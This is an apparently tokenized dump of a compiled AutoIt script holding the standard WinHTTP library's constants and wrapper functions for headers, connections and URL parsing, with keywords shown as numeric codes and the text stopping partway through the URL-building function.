2930$WINHTTP_ADDREQ_FLAG_ADD=536870912
2930$WINHTTP_ADDREQ_FLAG_COALESCE_WITH_COMMA=1073741824
2930$WINHTTP_ADDREQ_FLAG_COALESCE_WITH_SEMICOLON=16777216
2930$WINHTTP_ADDREQ_FLAG_COALESCE=$WINHTTP_ADDREQ_FLAG_COALESCE_WITH_COMMA
2930$WINHTTP_ADDREQ_FLAG_REPLACE=-2147483648
2930$WINHTTP_IGNORE_REQUEST_TOTAL_LENGTH=0
2930$WINHTTP_OPTION_CALLBACK=1
2930$WINHTTP_FIRST_OPTION=$WINHTTP_OPTION_CALLBACK
2930$WINHTTP_OPTION_RESOLVE_TIMEOUT=2
2930$WINHTTP_OPTION_CONNECT_TIMEOUT=3
2930$WINHTTP_OPTION_CONNECT_RETRIES=4
2930$WINHTTP_OPTION_SEND_TIMEOUT=5
2930$WINHTTP_OPTION_RECEIVE_TIMEOUT=6
2930$WINHTTP_OPTION_RECEIVE_RESPONSE_TIMEOUT=7
2930$WINHTTP_OPTION_HANDLE_TYPE=9
2930$WINHTTP_OPTION_READ_BUFFER_SIZE=12
2930$WINHTTP_OPTION_WRITE_BUFFER_SIZE=13
2930$WINHTTP_OPTION_PARENT_HANDLE=21
2930$WINHTTP_OPTION_EXTENDED_ERROR=24
2930$WINHTTP_OPTION_SECURITY_FLAGS=31
2930$WINHTTP_OPTION_SECURITY_CERTIFICATE_STRUCT=32
2930$WINHTTP_OPTION_URL=34
2930$WINHTTP_OPTION_SECURITY_KEY_BITNESS=36
2930$WINHTTP_OPTION_PROXY=38
2930$WINHTTP_OPTION_USER_AGENT=41
2930$WINHTTP_OPTION_CONTEXT_VALUE=45
2930$WINHTTP_OPTION_CLIENT_CERT_CONTEXT=47
2930$WINHTTP_OPTION_REQUEST_PRIORITY=58
2930$WINHTTP_OPTION_HTTP_VERSION=59
2930$WINHTTP_OPTION_DISABLE_FEATURE=63
2930$WINHTTP_OPTION_CODEPAGE=68
2930$WINHTTP_OPTION_MAX_CONNS_PER_SERVER=73
2930$WINHTTP_OPTION_MAX_CONNS_PER_1_0_SERVER=74
2930$WINHTTP_OPTION_AUTOLOGON_POLICY=77
2930$WINHTTP_OPTION_SERVER_CERT_CONTEXT=78
2930$WINHTTP_OPTION_ENABLE_FEATURE=79
2930$WINHTTP_OPTION_WORKER_THREAD_COUNT=80
2930$WINHTTP_OPTION_PASSPORT_COBRANDING_TEXT=81
2930$WINHTTP_OPTION_PASSPORT_COBRANDING_URL=82
2930$WINHTTP_OPTION_CONFIGURE_PASSPORT_AUTH=83
2930$WINHTTP_OPTION_SECURE_PROTOCOLS=84
2930$WINHTTP_OPTION_ENABLETRACING=85
2930$WINHTTP_OPTION_PASSPORT_SIGN_OUT=86
2930$WINHTTP_OPTION_PASSPORT_RETURN_URL=87
2930$WINHTTP_OPTION_REDIRECT_POLICY=88
2930$WINHTTP_OPTION_MAX_HTTP_AUTOMATIC_REDIRECTS=89
2930$WINHTTP_OPTION_MAX_HTTP_STATUS_CONTINUE=90
2930$WINHTTP_OPTION_MAX_RESPONSE_HEADER_SIZE=91
2930$WINHTTP_OPTION_MAX_RESPONSE_DRAIN_SIZE=92
2930$WINHTTP_OPTION_CONNECTION_INFO=93
2930$WINHTTP_OPTION_CLIENT_CERT_ISSUER_LIST=94
2930$WINHTTP_OPTION_SPN=96
2930$WINHTTP_OPTION_GLOBAL_PROXY_CREDS=97
2930$WINHTTP_OPTION_GLOBAL_SERVER_CREDS=98
2930$WINHTTP_OPTION_UNLOAD_NOTIFY_EVENT=99
2930$WINHTTP_OPTION_REJECT_USERPWD_IN_URL=100
2930$WINHTTP_OPTION_USE_GLOBAL_SERVER_CREDENTIALS=101
2930$WINHTTP_OPTION_RECEIVE_PROXY_CONNECT_RESPONSE=103
2930$WINHTTP_OPTION_IS_PROXY_CONNECT_RESPONSE=104
2930$WINHTTP_OPTION_SERVER_SPN_USED=106
2930$WINHTTP_OPTION_PROXY_SPN_USED=107
2930$WINHTTP_OPTION_SERVER_CBT=108
2930$WINHTTP_OPTION_UNSAFE_HEADER_PARSING=110
2930$WINHTTP_OPTION_DECOMPRESSION=118
2930$WINHTTP_LAST_OPTION=$WINHTTP_OPTION_DECOMPRESSION
2930$WINHTTP_OPTION_USERNAME=4096
2930$WINHTTP_OPTION_PASSWORD=4097
2930$WINHTTP_OPTION_PROXY_USERNAME=4098
2930$WINHTTP_OPTION_PROXY_PASSWORD=4099
2930$WINHTTP_CONNS_PER_SERVER_UNLIMITED=-1
2930$WINHTTP_DECOMPRESSION_FLAG_GZIP=1
2930$WINHTTP_DECOMPRESSION_FLAG_DEFLATE=2
2930$WINHTTP_DECOMPRESSION_FLAG_ALL=3
2930$WINHTTP_AUTOLOGON_SECURITY_LEVEL_MEDIUM=0
2930$WINHTTP_AUTOLOGON_SECURITY_LEVEL_LOW=1
2930$WINHTTP_AUTOLOGON_SECURITY_LEVEL_HIGH=2
2930$WINHTTP_AUTOLOGON_SECURITY_LEVEL_DEFAULT=$WINHTTP_AUTOLOGON_SECURITY_LEVEL_MEDIUM
2930$WINHTTP_OPTION_REDIRECT_POLICY_NEVER=0
2930$WINHTTP_OPTION_REDIRECT_POLICY_DISALLOW_HTTPS_TO_HTTP=1
2930$WINHTTP_OPTION_REDIRECT_POLICY_ALWAYS=2
2930$WINHTTP_OPTION_REDIRECT_POLICY_LAST=$WINHTTP_OPTION_REDIRECT_POLICY_ALWAYS
2930$WINHTTP_OPTION_REDIRECT_POLICY_DEFAULT=$WINHTTP_OPTION_REDIRECT_POLICY_DISALLOW_HTTPS_TO_HTTP
2930$WINHTTP_DISABLE_PASSPORT_AUTH=0
2930$WINHTTP_ENABLE_PASSPORT_AUTH=268435456
2930$WINHTTP_DISABLE_PASSPORT_KEYRING=536870912
2930$WINHTTP_ENABLE_PASSPORT_KEYRING=1073741824
2930$WINHTTP_DISABLE_COOKIES=1
2930$WINHTTP_DISABLE_REDIRECTS=2
2930$WINHTTP_DISABLE_AUTHENTICATION=4
2930$WINHTTP_DISABLE_KEEP_ALIVE=8
2930$WINHTTP_ENABLE_SSL_REVOCATION=1
2930$WINHTTP_ENABLE_SSL_REVERT_IMPERSONATION=2
2930$WINHTTP_DISABLE_SPN_SERVER_PORT=0
2930$WINHTTP_ENABLE_SPN_SERVER_PORT=1
2930$WINHTTP_OPTION_SPN_MASK=$WINHTTP_ENABLE_SPN_SERVER_PORT
2930$WINHTTP_ERROR_BASE=12000
2930$ERROR_WINHTTP_OUT_OF_HANDLES=12001
2930$ERROR_WINHTTP_TIMEOUT=12002
2930$ERROR_WINHTTP_INTERNAL_ERROR=12004
2930$ERROR_WINHTTP_INVALID_URL=12005
2930$ERROR_WINHTTP_UNRECOGNIZED_SCHEME=12006
2930$ERROR_WINHTTP_NAME_NOT_RESOLVED=12007
2930$ERROR_WINHTTP_INVALID_OPTION=12009
2930$ERROR_WINHTTP_OPTION_NOT_SETTABLE=12011
2930$ERROR_WINHTTP_SHUTDOWN=12012
2930$ERROR_WINHTTP_LOGIN_FAILURE=12015
2930$ERROR_WINHTTP_OPERATION_CANCELLED=12017
2930$ERROR_WINHTTP_INCORRECT_HANDLE_TYPE=12018
2930$ERROR_WINHTTP_INCORRECT_HANDLE_STATE=12019
2930$ERROR_WINHTTP_CANNOT_CONNECT=12029
2930$ERROR_WINHTTP_CONNECTION_ERROR=12030
2930$ERROR_WINHTTP_RESEND_REQUEST=12032
2930$ERROR_WINHTTP_SECURE_CERT_DATE_INVALID=12037
2930$ERROR_WINHTTP_SECURE_CERT_CN_INVALID=12038
2930$ERROR_WINHTTP_CLIENT_AUTH_CERT_NEEDED=12044
2930$ERROR_WINHTTP_SECURE_INVALID_CA=12045
2930$ERROR_WINHTTP_SECURE_CERT_REV_FAILED=12057
2930$ERROR_WINHTTP_CANNOT_CALL_BEFORE_OPEN=12100
2930$ERROR_WINHTTP_CANNOT_CALL_BEFORE_SEND=12101
2930$ERROR_WINHTTP_CANNOT_CALL_AFTER_SEND=12102
2930$ERROR_WINHTTP_CANNOT_CALL_AFTER_OPEN=12103
2930$ERROR_WINHTTP_HEADER_NOT_FOUND=12150
2930$ERROR_WINHTTP_INVALID_SERVER_RESPONSE=12152
2930$ERROR_WINHTTP_INVALID_HEADER=12153
2930$ERROR_WINHTTP_INVALID_QUERY_REQUEST=12154
2930$ERROR_WINHTTP_HEADER_ALREADY_EXISTS=12155
2930$ERROR_WINHTTP_REDIRECT_FAILED=12156
2930$ERROR_WINHTTP_SECURE_CHANNEL_ERROR=12157
2930$ERROR_WINHTTP_BAD_AUTO_PROXY_SCRIPT=12166
2930$ERROR_WINHTTP_UNABLE_TO_DOWNLOAD_SCRIPT=12167
2930$ERROR_WINHTTP_SECURE_INVALID_CERT=12169
2930$ERROR_WINHTTP_SECURE_CERT_REVOKED=12170
2930$ERROR_WINHTTP_NOT_INITIALIZED=12172
2930$ERROR_WINHTTP_SECURE_FAILURE=12175
2930$ERROR_WINHTTP_AUTO_PROXY_SERVICE_ERROR=12178
2930$ERROR_WINHTTP_SECURE_CERT_WRONG_USAGE=12179
2930$ERROR_WINHTTP_AUTODETECTION_FAILED=12180
2930$ERROR_WINHTTP_HEADER_COUNT_EXCEEDED=12181
2930$ERROR_WINHTTP_HEADER_SIZE_OVERFLOW=12182
2930$ERROR_WINHTTP_CHUNKED_ENCODING_HEADER_SIZE_OVERFLOW=12183
2930$ERROR_WINHTTP_RESPONSE_DRAIN_OVERFLOW=12184
2930$ERROR_WINHTTP_CLIENT_CERT_NO_PRIVATE_KEY=12185
2930$ERROR_WINHTTP_CLIENT_CERT_NO_ACCESS_PRIVATE_KEY=12186
2930$WINHTTP_ERROR_LAST=12186
2930$HTTP_STATUS_CONTINUE=100
2930$HTTP_STATUS_SWITCH_PROTOCOLS=101
2930$HTTP_STATUS_OK=200
2930$HTTP_STATUS_CREATED=201
2930$HTTP_STATUS_ACCEPTED=202
2930$HTTP_STATUS_PARTIAL=203
2930$HTTP_STATUS_NO_CONTENT=204
2930$HTTP_STATUS_RESET_CONTENT=205
2930$HTTP_STATUS_PARTIAL_CONTENT=206
2930$HTTP_STATUS_WEBDAV_MULTI_STATUS=207
2930$HTTP_STATUS_AMBIGUOUS=300
2930$HTTP_STATUS_MOVED=301
2930$HTTP_STATUS_REDIRECT=302
2930$HTTP_STATUS_REDIRECT_METHOD=303
2930$HTTP_STATUS_NOT_MODIFIED=304
2930$HTTP_STATUS_USE_PROXY=305
2930$HTTP_STATUS_REDIRECT_KEEP_VERB=307
2930$HTTP_STATUS_BAD_REQUEST=400
2930$HTTP_STATUS_DENIED=401
2930$HTTP_STATUS_PAYMENT_REQ=402
2930$HTTP_STATUS_FORBIDDEN=403
2930$HTTP_STATUS_NOT_FOUND=404
2930$HTTP_STATUS_BAD_METHOD=405
2930$HTTP_STATUS_NONE_ACCEPTABLE=406
2930$HTTP_STATUS_PROXY_AUTH_REQ=407
2930$HTTP_STATUS_REQUEST_TIMEOUT=408
2930$HTTP_STATUS_CONFLICT=409
2930$HTTP_STATUS_GONE=410
2930$HTTP_STATUS_LENGTH_REQUIRED=411
2930$HTTP_STATUS_PRECOND_FAILED=412
2930$HTTP_STATUS_REQUEST_TOO_LARGE=413
2930$HTTP_STATUS_URI_TOO_LONG=414
2930$HTTP_STATUS_UNSUPPORTED_MEDIA=415
2930$HTTP_STATUS_RETRY_WITH=449
2930$HTTP_STATUS_SERVER_ERROR=500
2930$HTTP_STATUS_NOT_SUPPORTED=501
2930$HTTP_STATUS_BAD_GATEWAY=502
2930$HTTP_STATUS_SERVICE_UNAVAIL=503
2930$HTTP_STATUS_GATEWAY_TIMEOUT=504
2930$HTTP_STATUS_VERSION_NOT_SUP=505
2930$HTTP_STATUS_FIRST=$HTTP_STATUS_CONTINUE
2930$HTTP_STATUS_LAST=$HTTP_STATUS_VERSION_NOT_SUP
2930$SECURITY_FLAG_IGNORE_UNKNOWN_CA=256
2930$SECURITY_FLAG_IGNORE_CERT_DATE_INVALID=8192
2930$SECURITY_FLAG_IGNORE_CERT_CN_INVALID=4096
2930$SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE=512
2930$SECURITY_FLAG_SECURE=1
2930$SECURITY_FLAG_STRENGTH_WEAK=268435456
2930$SECURITY_FLAG_STRENGTH_MEDIUM=1073741824
2930$SECURITY_FLAG_STRENGTH_STRONG=536870912
2930$ICU_NO_ENCODE=536870912
2930$ICU_DECODE=268435456
2930$ICU_NO_META=134217728
2930$ICU_ENCODE_SPACES_ONLY=67108864
2930$ICU_BROWSER_MODE=33554432
2930$ICU_ENCODE_PERCENT=4096
2930$WINHTTP_QUERY_MIME_VERSION=0
2930$WINHTTP_QUERY_CONTENT_TYPE=1
2930$WINHTTP_QUERY_CONTENT_TRANSFER_ENCODING=2
2930$WINHTTP_QUERY_CONTENT_ID=3
2930$WINHTTP_QUERY_CONTENT_DESCRIPTION=4
2930$WINHTTP_QUERY_CONTENT_LENGTH=5
2930$WINHTTP_QUERY_CONTENT_LANGUAGE=6
2930$WINHTTP_QUERY_ALLOW=7
2930$WINHTTP_QUERY_PUBLIC=8
2930$WINHTTP_QUERY_DATE=9
2930$WINHTTP_QUERY_EXPIRES=10
2930$WINHTTP_QUERY_LAST_MODIFIED=11
2930$WINHTTP_QUERY_MESSAGE_ID=12
2930$WINHTTP_QUERY_URI=13
2930$WINHTTP_QUERY_DERIVED_FROM=14
2930$WINHTTP_QUERY_COST=15
2930$WINHTTP_QUERY_LINK=16
2930$WINHTTP_QUERY_PRAGMA=17
2930$WINHTTP_QUERY_VERSION=18
2930$WINHTTP_QUERY_STATUS_CODE=19
2930$WINHTTP_QUERY_STATUS_TEXT=20
2930$WINHTTP_QUERY_RAW_HEADERS=21
2930$WINHTTP_QUERY_RAW_HEADERS_CRLF=22
2930$WINHTTP_QUERY_CONNECTION=23
2930$WINHTTP_QUERY_ACCEPT=24
2930$WINHTTP_QUERY_ACCEPT_CHARSET=25
2930$WINHTTP_QUERY_ACCEPT_ENCODING=26
2930$WINHTTP_QUERY_ACCEPT_LANGUAGE=27
2930$WINHTTP_QUERY_AUTHORIZATION=28
2930$WINHTTP_QUERY_CONTENT_ENCODING=29
2930$WINHTTP_QUERY_FORWARDED=30
2930$WINHTTP_QUERY_FROM=31
2930$WINHTTP_QUERY_IF_MODIFIED_SINCE=32
2930$WINHTTP_QUERY_LOCATION=33
2930$WINHTTP_QUERY_ORIG_URI=34
2930$WINHTTP_QUERY_REFERER=35
2930$WINHTTP_QUERY_RETRY_AFTER=36
2930$WINHTTP_QUERY_SERVER=37
2930$WINHTTP_QUERY_TITLE=38
2930$WINHTTP_QUERY_USER_AGENT=39
2930$WINHTTP_QUERY_WWW_AUTHENTICATE=40
2930$WINHTTP_QUERY_PROXY_AUTHENTICATE=41
2930$WINHTTP_QUERY_ACCEPT_RANGES=42
2930$WINHTTP_QUERY_SET_COOKIE=43
2930$WINHTTP_QUERY_COOKIE=44
2930$WINHTTP_QUERY_REQUEST_METHOD=45
2930$WINHTTP_QUERY_REFRESH=46
2930$WINHTTP_QUERY_CONTENT_DISPOSITION=47
2930$WINHTTP_QUERY_AGE=48
2930$WINHTTP_QUERY_CACHE_CONTROL=49
2930$WINHTTP_QUERY_CONTENT_BASE=50
2930$WINHTTP_QUERY_CONTENT_LOCATION=51
2930$WINHTTP_QUERY_CONTENT_MD5=52
2930$WINHTTP_QUERY_CONTENT_RANGE=53
2930$WINHTTP_QUERY_ETAG=54
2930$WINHTTP_QUERY_HOST=55
2930$WINHTTP_QUERY_IF_MATCH=56
2930$WINHTTP_QUERY_IF_NONE_MATCH=57
2930$WINHTTP_QUERY_IF_RANGE=58
2930$WINHTTP_QUERY_IF_UNMODIFIED_SINCE=59
2930$WINHTTP_QUERY_MAX_FORWARDS=60
2930$WINHTTP_QUERY_PROXY_AUTHORIZATION=61
2930$WINHTTP_QUERY_RANGE=62
2930$WINHTTP_QUERY_TRANSFER_ENCODING=63
2930$WINHTTP_QUERY_UPGRADE=64
2930$WINHTTP_QUERY_VARY=65
2930$WINHTTP_QUERY_VIA=66
2930$WINHTTP_QUERY_WARNING=67
2930$WINHTTP_QUERY_EXPECT=68
2930$WINHTTP_QUERY_PROXY_CONNECTION=69
2930$WINHTTP_QUERY_UNLESS_MODIFIED_SINCE=70
2930$WINHTTP_QUERY_PROXY_SUPPORT=75
2930$WINHTTP_QUERY_AUTHENTICATION_INFO=76
2930$WINHTTP_QUERY_PASSPORT_URLS=77
2930$WINHTTP_QUERY_PASSPORT_CONFIG=78
2930$WINHTTP_QUERY_MAX=78
2930$WINHTTP_QUERY_CUSTOM=65535
2930$WINHTTP_QUERY_FLAG_REQUEST_HEADERS=-2147483648
2930$WINHTTP_QUERY_FLAG_SYSTEMTIME=1073741824
2930$WINHTTP_QUERY_FLAG_NUMBER=536870912
2930$WINHTTP_CALLBACK_STATUS_RESOLVING_NAME=1
2930$WINHTTP_CALLBACK_STATUS_NAME_RESOLVED=2
2930$WINHTTP_CALLBACK_STATUS_CONNECTING_TO_SERVER=4
2930$WINHTTP_CALLBACK_STATUS_CONNECTED_TO_SERVER=8
2930$WINHTTP_CALLBACK_STATUS_SENDING_REQUEST=16
2930$WINHTTP_CALLBACK_STATUS_REQUEST_SENT=32
2930$WINHTTP_CALLBACK_STATUS_RECEIVING_RESPONSE=64
2930$WINHTTP_CALLBACK_STATUS_RESPONSE_RECEIVED=128
2930$WINHTTP_CALLBACK_STATUS_CLOSING_CONNECTION=256
2930$WINHTTP_CALLBACK_STATUS_CONNECTION_CLOSED=512
2930$WINHTTP_CALLBACK_STATUS_HANDLE_CREATED=1024
2930$WINHTTP_CALLBACK_STATUS_HANDLE_CLOSING=2048
2930$WINHTTP_CALLBACK_STATUS_DETECTING_PROXY=4096
2930$WINHTTP_CALLBACK_STATUS_REDIRECT=16384
2930$WINHTTP_CALLBACK_STATUS_INTERMEDIATE_RESPONSE=32768
2930$WINHTTP_CALLBACK_STATUS_SECURE_FAILURE=65536
2930$WINHTTP_CALLBACK_STATUS_HEADERS_AVAILABLE=131072
2930$WINHTTP_CALLBACK_STATUS_DATA_AVAILABLE=262144
2930$WINHTTP_CALLBACK_STATUS_READ_COMPLETE=524288
2930$WINHTTP_CALLBACK_STATUS_WRITE_COMPLETE=1048576
2930$WINHTTP_CALLBACK_STATUS_REQUEST_ERROR=2097152
2930$WINHTTP_CALLBACK_STATUS_SENDREQUEST_COMPLETE=4194304
2930$WINHTTP_CALLBACK_FLAG_RESOLVE_NAME=3
2930$WINHTTP_CALLBACK_FLAG_CONNECT_TO_SERVER=12
2930$WINHTTP_CALLBACK_FLAG_SEND_REQUEST=48
2930$WINHTTP_CALLBACK_FLAG_RECEIVE_RESPONSE=192
2930$WINHTTP_CALLBACK_FLAG_CLOSE_CONNECTION=768
2930$WINHTTP_CALLBACK_FLAG_HANDLES=3072
2930$WINHTTP_CALLBACK_FLAG_DETECTING_PROXY=$WINHTTP_CALLBACK_STATUS_DETECTING_PROXY
2930$WINHTTP_CALLBACK_FLAG_REDIRECT=$WINHTTP_CALLBACK_STATUS_REDIRECT
2930$WINHTTP_CALLBACK_FLAG_INTERMEDIATE_RESPONSE=$WINHTTP_CALLBACK_STATUS_INTERMEDIATE_RESPONSE
2930$WINHTTP_CALLBACK_FLAG_SECURE_FAILURE=$WINHTTP_CALLBACK_STATUS_SECURE_FAILURE
2930$WINHTTP_CALLBACK_FLAG_SENDREQUEST_COMPLETE=$WINHTTP_CALLBACK_STATUS_SENDREQUEST_COMPLETE
2930$WINHTTP_CALLBACK_FLAG_HEADERS_AVAILABLE=$WINHTTP_CALLBACK_STATUS_HEADERS_AVAILABLE
2930$WINHTTP_CALLBACK_FLAG_DATA_AVAILABLE=$WINHTTP_CALLBACK_STATUS_DATA_AVAILABLE
2930$WINHTTP_CALLBACK_FLAG_READ_COMPLETE=$WINHTTP_CALLBACK_STATUS_READ_COMPLETE
2930$WINHTTP_CALLBACK_FLAG_WRITE_COMPLETE=$WINHTTP_CALLBACK_STATUS_WRITE_COMPLETE
2930$WINHTTP_CALLBACK_FLAG_REQUEST_ERROR=$WINHTTP_CALLBACK_STATUS_REQUEST_ERROR
2930$WINHTTP_CALLBACK_FLAG_ALL_COMPLETIONS=8257536
2930$WINHTTP_CALLBACK_FLAG_ALL_NOTIFICATIONS=-1
2930$API_RECEIVE_RESPONSE=1
2930$API_QUERY_DATA_AVAILABLE=2
2930$API_READ_DATA=3
2930$API_WRITE_DATA=4
2930$API_SEND_REQUEST=5
2930$WINHTTP_HANDLE_TYPE_SESSION=1
2930$WINHTTP_HANDLE_TYPE_CONNECT=2
2930$WINHTTP_HANDLE_TYPE_REQUEST=3
2930$WINHTTP_CALLBACK_STATUS_FLAG_CERT_REV_FAILED=1
2930$WINHTTP_CALLBACK_STATUS_FLAG_INVALID_CERT=2
2930$WINHTTP_CALLBACK_STATUS_FLAG_CERT_REVOKED=4
2930$WINHTTP_CALLBACK_STATUS_FLAG_INVALID_CA=8
2930$WINHTTP_CALLBACK_STATUS_FLAG_CERT_CN_INVALID=16
2930$WINHTTP_CALLBACK_STATUS_FLAG_CERT_DATE_INVALID=32
2930$WINHTTP_CALLBACK_STATUS_FLAG_CERT_WRONG_USAGE=64
2930$WINHTTP_CALLBACK_STATUS_FLAG_SECURITY_CHANNEL_ERROR=-2147483648
2930$WINHTTP_FLAG_SECURE_PROTOCOL_SSL2=8
2930$WINHTTP_FLAG_SECURE_PROTOCOL_SSL3=32
2930$WINHTTP_FLAG_SECURE_PROTOCOL_TLS1=128
2930$WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1=512
2930$WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2=2048
2930$WINHTTP_FLAG_SECURE_PROTOCOL_ALL=168
2930$WINHTTP_AUTH_SCHEME_BASIC=1
2930$WINHTTP_AUTH_SCHEME_NTLM=2
2930$WINHTTP_AUTH_SCHEME_PASSPORT=4
2930$WINHTTP_AUTH_SCHEME_DIGEST=8
2930$WINHTTP_AUTH_SCHEME_NEGOTIATE=16
2930$WINHTTP_AUTH_TARGET_SERVER=0
2930$WINHTTP_AUTH_TARGET_PROXY=1
2930$WINHTTP_AUTOPROXY_AUTO_DETECT=1
2930$WINHTTP_AUTOPROXY_CONFIG_URL=2
2930$WINHTTP_AUTOPROXY_RUN_INPROCESS=65536
2930$WINHTTP_AUTOPROXY_RUN_OUTPROCESS_ONLY=131072
2930$WINHTTP_AUTO_DETECT_TYPE_DHCP=1
2930$WINHTTP_AUTO_DETECT_TYPE_DNS_A=2
2930$HWINHTTPDLL__WINHTTP=64("winhttp.dll")
64("winhttp.dll")
32_WINHTTPADDREQUESTHEADERS($HREQUEST,$SHEADER,$IMODIFIER=41)
__WINHTTPDEFAULT($IMODIFIER,$WINHTTP_ADDREQ_FLAG_ADD_IF_NEW)
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpAddRequestHeaders","handle",$HREQUEST,"wstr",$SHEADER,"dword",-1,"dword",$IMODIFIER)
4@ERROR23$ACALL[0]534287(1,0,0)
341
33
32_WINHTTPCHECKPLATFORM()
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpCheckPlatform")
4@ERROR534287(1,0,0)
34$ACALL[0]
33
32_WINHTTPCLOSEHANDLE($HINTERNET)
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpCloseHandle","handle",$HINTERNET)
4@ERROR23$ACALL[0]534287(1,0,0)
341
33
32_WINHTTPCONNECT($HSESSION,$SSERVERNAME,$ISERVERPORT=41)
28$AURL=_WINHTTPCRACKURL($SSERVERNAME),$ISCHEME=0
4@ERROR5
__WINHTTPDEFAULT($ISERVERPORT,$INTERNET_DEFAULT_PORT)
6
$SSERVERNAME=$AURL[2]
$ISERVERPORT=$AURL[3]
$ISCHEME=$AURL[1]
8
28$ACALL=58($HWINHTTPDLL__WINHTTP,"handle","WinHttpConnect","handle",$HSESSION,"wstr",$SSERVERNAME,"dword",$ISERVERPORT,"dword",0)
4@ERROR23$ACALL[0]534287(1,0,0)
_WINHTTPSETOPTION($ACALL[0],$WINHTTP_OPTION_CONTEXT_VALUE,$ISCHEME)
34$ACALL[0]
33
32_WINHTTPCRACKURL($SURL,$IFLAG=41)
__WINHTTPDEFAULT($IFLAG,$ICU_ESCAPE)
28$TURL_COMPONENTS=65("dword StructSize;"&"ptr SchemeName;"&"dword SchemeNameLength;"&"int Scheme;"&"ptr HostName;"&"dword HostNameLength;"&"word Port;"&"ptr UserName;"&"dword UserNameLength;"&"ptr Password;"&"dword PasswordLength;"&"ptr UrlPath;"&"dword UrlPathLength;"&"ptr ExtraInfo;"&"dword ExtraInfoLength")
69($TURL_COMPONENTS,1,68($TURL_COMPONENTS))
28$TBUFFERS[6]
28$IURLLEN=323($SURL)
13$I=0155
$TBUFFERS[$I]=65("wchar["&$IURLLEN+1&"]")
14
69($TURL_COMPONENTS,"SchemeNameLength",$IURLLEN)
69($TURL_COMPONENTS,"SchemeName",67($TBUFFERS[0]))
69($TURL_COMPONENTS,"HostNameLength",$IURLLEN)
69($TURL_COMPONENTS,"HostName",67($TBUFFERS[1]))
69($TURL_COMPONENTS,"UserNameLength",$IURLLEN)
69($TURL_COMPONENTS,"UserName",67($TBUFFERS[2]))
69($TURL_COMPONENTS,"PasswordLength",$IURLLEN)
69($TURL_COMPONENTS,"Password",67($TBUFFERS[3]))
69($TURL_COMPONENTS,"UrlPathLength",$IURLLEN)
69($TURL_COMPONENTS,"UrlPath",67($TBUFFERS[4]))
69($TURL_COMPONENTS,"ExtraInfoLength",$IURLLEN)
69($TURL_COMPONENTS,"ExtraInfo",67($TBUFFERS[5]))
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpCrackUrl","wstr",$SURL,"dword",$IURLLEN,"dword",$IFLAG,"struct*",$TURL_COMPONENTS)
4@ERROR23$ACALL[0]534287(1,0,0)
28$ARET[8]=[66($TBUFFERS[0],1),66($TURL_COMPONENTS,"Scheme"),66($TBUFFERS[1],1),66($TURL_COMPONENTS,"Port"),66($TBUFFERS[2],1),66($TBUFFERS[3],1),66($TBUFFERS[4],1),66($TBUFFERS[5],1)]
34$ARET
33
32_WINHTTPCREATEURL($AURLARRAY)
4369($AURLARRAY)-8534287(1,0,"")
28$TURL_COMPONENTS=65("dword StructSize;"&"ptr SchemeName;"&"dword SchemeNameLength;"&"int Scheme;"&"ptr HostName;"&"dword HostNameLength;"&"word Port;"&"ptr UserName;"&"dword UserNameLength;"&"ptr Password;"&"dword PasswordLength;"&"ptr UrlPath;"&"dword UrlPathLength;"&"ptr ExtraInfo;"&"dword ExtraInfoLength;")
69($TURL_COMPONENTS,1,68($TURL_COMPONENTS))
28$TBUFFERS[6][2]
$TBUFFERS[0][1]=323($AURLARRAY[0])
4$TBUFFERS[0][1]5
$TBUFFERS[0][0]=65("wchar["&$TBUFFERS[0][1]+1&"]")
69($TBUFFERS[0][0],1,$AURLARRAY[0])
8
$TBUFFERS[1][1]=323($AURLARRAY[2])
4$TBUFFERS[1][1]5
$TBUFFERS[1][0]=65("wchar["&$TBUFFERS[1][1]+1&"]")
69($TBUFFERS[1][0],1,$AURLARRAY[2])
8
$TBUFFERS[2][1]=323($AURLARRAY[4])
4$TBUFFERS[2][1]5
$TBUFFERS[2][0]=65("wchar["&$TBUFFERS[2][1]+1&"]")
69($TBUFFERS[2][0],1,$AURLARRAY[4])
8
$TBUFFERS[3][1]=323($AURLARRAY[5])
4$TBUFFERS[3][1]5
$TBUFFERS[3][0]=65("wchar["&$TBUFFERS[3][1]+1&"]")
69($TBUFFERS[3][0],1,$AURLARRAY[5])
8
$TBUFFERS[4][1]=323($AURLARRAY[6])
4$TBUFFERS[4][1]5
$TBUFFERS[4][0]=65("wchar["&$TBUFFERS[4][1]+1&"]")
69($TBUFFERS[4][0],1,$AURLARRAY[6])
8
$TBUFFERS[5][1]=323($AURLARRAY[7])
4$TBUFFERS[5][1]5
$TBUFFERS[5][0]=65("wchar["&$TBUFFERS[5][1]+1&"]")
69($TBUFFERS[5][0],1,$AURLARRAY[7])
8
69($TURL_COMPONENTS,"SchemeNameLength",$TBUFFERS[0][1])
69($TURL_COMPONENTS,"SchemeName",67($TBUFFERS[0][0]))
69($TURL_COMPONENTS,"HostNameLength",$TBUFFERS[1][1])
69($TURL_COMPONENTS,"HostName",67($TBUFFERS[1][0]))
69($TURL_COMPONENTS,"UserNameLength",$TBUFFERS[2][1])
69($TURL_COMPONENTS,"UserName",67($TBUFFERS[2][0]))
69($TURL_COMPONENTS,"PasswordLength",$TBUFFERS[3][1])
69($TURL_COMPONENTS,"Password",67($TBUFFERS[3][0]))
69($TURL_COMPONENTS,"UrlPathLength",$TBUFFERS[4][1])
69($TURL_COMPONENTS,"UrlPath",67($TBUFFERS[4][0]))
69($TURL_COMPONENTS,"ExtraInfoLength",$TBUFFERS[5][1])
69($TURL_COMPONENTS,"ExtraInfo",67($TBUFFERS[5][0]))
69($TURL_COMPONENTS,"Scheme",$AURLARRAY[1])
69($TURL_COMPONENTS,"Port",$AURLARRAY[3])
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpCreateUrl","struct*",$TURL_COMPONENTS,"dword",$ICU_ESCAPE,"ptr",0,"dword*",0)
4@ERROR534287(2,0,"")
28$IURLLEN=$ACALL[4]
28$URLBUFFER=65("wchar["&($IURLLEN+1)&"]")
$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpCreateUrl","struct*",$TURL_COMPONENTS,"dword",$ICU_ESCAPE,"struct*",$URLBUFFER,"dword*",$IURLLEN)
4@ERROR23$ACALL[0]534287(3,0,"")
